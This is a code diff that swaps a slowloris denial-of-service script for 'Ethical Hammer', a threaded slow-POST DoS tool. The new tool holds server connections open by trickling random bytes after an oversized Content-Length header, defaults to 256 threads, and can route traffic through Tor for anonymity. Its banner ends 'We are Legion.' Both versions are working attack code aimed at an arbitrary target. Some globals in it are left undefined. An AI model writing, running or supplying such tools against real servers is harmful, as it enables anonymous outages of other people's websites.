@@ -1,80 +1,131 @@
-import socket
-import ssl
-import random
-import logging
-from argparse import ArgumentParser
+#!/usr/bin/python
 import time
+import sys
+import random
+import getopt
+import socks
+import string
+import terminal
+from threading import Thread
 
-DEFAULT_USER_AGENTS = [
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/5.3",
-    # Add more user agents as needed
-]
+class EthicalHammer(Thread):
+    def __init__(self, host, port, tor):
+        super(EthicalHammer, self).__init__()
+        self.host = host
+        self.port = port
+        self.socks = socks.socksocket()
+        self.tor = tor
+        self.running = True
 
-DEFAULT_SOCK_TIMEOUT = 4
+    def _send_http_post(self, pause=10):
+        global stop_now
 
-def generate_fake_identity():
-    return "Anonymous"
+        headers = (
+            "POST / HTTP/1.1\r\n"
+            "Host: %s\r\n"
+            "User-Agent: %s\r\n"
+            "Connection: keep-alive\r\n"
+            "Keep-Alive: 900\r\n"
+            "Content-Length: 10000\r\n"
+            "Content-Type: application/x-www-form-urlencoded\r\n\r\n" %
+            (self.host, random.choice(useragents))
+        )
 
-def send_line(s, line, identity):
-    line = f"{line}\r\n"
-    s.send(line.encode("utf-8"))
-    s.send(f"X-Identity: {identity}\r\n".encode("utf-8"))
-
-def init_socket(ip: str, port, identity):
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.settimeout(DEFAULT_SOCK_TIMEOUT)
-
-    s.connect((ip, port))
-
-    send_line(s, f"GET /?{random.randint(0, 2000)} HTTP/1.1", identity)
-
-    ua = DEFAULT_USER_AGENTS[0]
-    send_line(s, f"User-Agent: {ua}", identity)
-    send_line(s, "Accept-language: en-US,en,q=0.5", identity)
-
-    return s
-
-def slowloris_iteration(list_of_sockets):
-    logging.debug("Sending keep-alive headers...")
-
-    identity = generate_fake_identity()
-
-    for s in list(list_of_sockets):
         try:
-            send_line(s, f"X-a: {random.randint(1, 5000)}", identity)
-        except socket.error:
-            list_of_sockets.remove(s)
+            self.socks.send(headers)
+            for _ in range(9999):
+                if stop_now:
+                    self.running = False
+                    break
+                payload = random.choice(string.ascii_letters + string.digits)
+                print(term.BOL + term.UP + term.CLEAR_EOL + "Posting: %s" % payload + term.NORMAL)
+                self.socks.send(payload)
+                time.sleep(random.uniform(0.1, 3))
+        except Exception as e:
+            print("Error during POST:", e)
 
-    # Sleep for a random amount of time to slow down the attack
-    sleep_time = random.randint(1, 5)
-    logging.debug("Sleeping for %s seconds...", sleep_time)
-    time.sleep(sleep_time)
+    def run(self):
+        while self.running:
+            try:
+                if self.tor:
+                    self.socks.set_proxy(socks.SOCKS5, '127.0.0.1', 9150)
+                    time.sleep(1)
+                self.socks.connect((self.host, self.port))
+                print(term.BOL + term.UP + term.CLEAR_EOL + "Connected to host..." + term.NORMAL)
+                self._send_http_post()
+            except Exception as e:
+                print("Error:", e)
+                time.sleep(1)
+                sys.exit()
 
-def ddos_onion():
-    logging.basicConfig(level=logging.DEBUG)
+def usage():
+    print("./ethical_hammer.py -t <target> [-r <threads> -p <port> -T -h]")
+    print(" -t|--target <Hostname|IP>")
+    print(" -r|--threads <Number of threads> Defaults to 256")
+    print(" -p|--port <Web Server Port> Defaults to 80")
+    print(" -T|--tor Enable anonymizing through Tor on 127.0.0.1:9150")
+    print(" -h|--help Shows this help\n")
+    print("E.g., ./ethical_hammer.py -t 192.168.1.100 -r 256\n")
 
-    parser = ArgumentParser()
-    parser.add_argument("-t", "--target", type=str, required=True, help="Target IP address")
-    parser.add_argument("-p", "--port", type=int, default=80, help="Target port")
-    parser.add_argument("-c", "--connections", type=int, default=100, help="Number of initial connections")
-    args = parser.parse_args()
+def main(argv):
+    try:
+        opts, _ = getopt.getopt(argv, "hTt:r:p:", ["help", "tor", "target=", "threads=", "port="])
+    except getopt.GetoptError:
+        usage()
+        sys.exit(-1)
 
-    target_ip = args.target
-    target_port = args.port
-    num_connections = args.connections
+    global stop_now
 
-    list_of_sockets = []
+    target = ''
+    threads = 256
+    tor = False
+    port = 80
 
-    for _ in range(num_connections):  # Number of initial connections
+    for opt, arg in opts:
+        if opt in ("-h", "--help"):
+            usage()
+            sys.exit(0)
+        if opt in ("-T", "--tor"):
+            tor = True
+        elif opt in ("-t", "--target"):
+            target = arg
+        elif opt in ("-r", "--threads"):
+            threads = int(arg)
+        elif opt in ("-p", "--port"):
+            port = int(arg)
+
+    if not target or threads <= 0:
+        usage()
+        sys.exit(-1)
+
+    print(term.DOWN + term.RED + "/*" + term.NORMAL)
+    print(term.RED + f" * Target: {target} Port: {port}" + term.NORMAL)
+    print(term.RED + f" * Threads: {threads} Tor: {tor}" + term.NORMAL)
+    print(term.RED + " * Give 20 seconds without Tor or 40 with before checking the site" + term.NORMAL)
+    print(term.RED + " */" + term.DOWN + term.DOWN + term.NORMAL)
+
+    thread_list = []
+    for _ in range(threads):
+        t = EthicalHammer(target, port, tor)
+        thread_list.append(t)
+        t.start()
+
+    while thread_list:
         try:
-            s = init_socket(target_ip, target_port, generate_fake_identity())
-            list_of_sockets.append(s)
-        except socket.error as e:
-            logging.debug("Failed to create new socket: %s", e)
-            break
-
-    while True:
-        slowloris_iteration(list_of_sockets)
+            thread_list = [t.join(1) for t in thread_list if t is not None and t.is_alive()]
+        except KeyboardInterrupt:
+            print("\nShutting down threads...\n")
+            for t in thread_list:
+                stop_now = True
+                t.running = False
 
 if __name__ == "__main__":
-    ddos_onion()
+    print("\n/*")
+    print(" *" + term.RED + " Ethical Hammer " + term.NORMAL)
+    print(" * Slow POST DoS Testing Tool")
+    print(" * entropy [at] phiral.net")
+    print(" * Anon-ymized via Tor")
+    print(" * We are Legion.")
+    print(" */\n")
+
+    main(sys.argv[1:])
